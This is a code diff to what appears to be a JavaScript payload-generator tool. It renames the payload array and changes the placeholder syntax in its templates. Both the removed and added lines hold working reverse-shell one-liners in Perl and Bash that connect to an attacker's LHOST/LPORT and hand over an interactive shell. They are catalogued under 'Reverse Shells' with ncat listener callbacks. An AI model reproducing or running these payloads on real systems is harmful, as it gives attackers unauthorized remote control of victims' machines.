@@ -57,10 +57,10 @@ var ncatInit = function(returnToPrepare, msg, type){
 
 
 // Payload Array
-arrayExploit = []
+arrayMisc = []
 
 var Load = function(obj){
-	arrayExploit.push(obj)
+	arrayMisc.push(obj)
 }
 
 /* 
@@ -100,8 +100,7 @@ Load({
 
 Load({
 	title: "Reverse Shell Perl",
-	payload: "perl -e 'use Socket;$i=\"$$LHOST$$\";$p=$$LPORT$$;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"$$PROMPT$$ -i\");};'",
-	sample: "perl -e 'use Socket;$i=\"$$LHOST$$\";$p=$$LPORT$$;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"<shell type> -i\");};'",
+	payload: "perl -e 'use Socket;$i=\"<LHOST>\";$p=<LPORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"<PROMPT (shell type)> -i\");};'",
 	category: "Reverse Shells",
 	callback: function(returnToPrepare){
 		ncatInit(returnToPrepare, "Enter the type of shell to use (/bin/sh , cmd.exe , etc) :", "shell")
@@ -110,8 +109,7 @@ Load({
 
 Load({
 	title: "Reverse Shell Bash",
-	payload: "bash -i >& /dev/tcp/$$LHOST$$/$$LPORT$$ 0>&1",
-	sample: "bash -i >& /dev/tcp/"+red("<lhost>")+"/"+red("<lport>")+" 0>&1",
+	payload: "bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1",
 	category: "Reverse Shells",
 	callback: function(returnToPrepare){
 		ncatInit(returnToPrepare, null, "shell")
@@ -139,21 +137,21 @@ module.exports = {
 	values: arrayInfo,
 	getAll: function(value){
 		tempArray = []
-		for(i=0;i<arrayExploit.length;i++){
-			if (arrayExploit[i].category === value){
-				tempArray.push(arrayExploit[i])
+		for(i=0;i<arrayMisc.length;i++){
+			if (arrayMisc[i].category === value){
+				tempArray.push(arrayMisc[i])
 			}
 		}
 		return tempArray
 	},
 	getCategories: function(){
-		for (i=0;i<arrayExploit.length;i++){
-			if(unique[arrayExploit[i].category]){
+		for (i=0;i<arrayMisc.length;i++){
+			if(unique[arrayMisc[i].category]){
 
 			}
 			else {
-				unique[arrayExploit[i].category] = true;
-				uniqueCategories.push(arrayExploit[i].category)
+				unique[arrayMisc[i].category] = true;
+				uniqueCategories.push(arrayMisc[i].category)
 			} 
 		return uniqueCategories
 		}
